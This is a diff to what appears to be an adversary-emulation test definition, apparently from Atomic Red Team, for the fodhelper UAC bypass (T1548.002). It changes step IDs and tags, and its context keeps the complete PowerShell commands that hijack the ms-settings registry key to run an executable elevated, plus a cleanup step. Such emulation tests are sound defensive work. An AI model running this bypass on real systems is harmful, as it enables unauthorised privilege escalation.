@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "dedb748d-f1ed-4592-951a-adec501d4228",
+      "id": "813deb24-cfe7-45d8-82b7-1d33e5d36b6f",
       "type": "execute-command",
       "data": {
         "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "e36a2c31-1ae5-4b6f-aab1-478e50337578",
+      "id": "a27437b2-1da3-4623-9760-5f7f5a755ea6",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore\n",
@@ -27,19 +27,19 @@
   ],
   "flows": [
     {
-      "s": "dedb748d-f1ed-4592-951a-adec501d4228",
+      "s": "813deb24-cfe7-45d8-82b7-1d33e5d36b6f",
       "p": "on-success",
-      "o": "e36a2c31-1ae5-4b6f-aab1-478e50337578"
+      "o": "a27437b2-1da3-4623-9760-5f7f5a755ea6"
     },
     {
-      "s": "dedb748d-f1ed-4592-951a-adec501d4228",
+      "s": "813deb24-cfe7-45d8-82b7-1d33e5d36b6f",
       "p": "on-failure",
-      "o": "e36a2c31-1ae5-4b6f-aab1-478e50337578"
+      "o": "a27437b2-1da3-4623-9760-5f7f5a755ea6"
     }
   ],
   "tags": [
-    "T1548.002",
-    "atomic-red-team"
+    "T1548",
+    "T1548.002"
   ],
   "input_arguments": [
     {
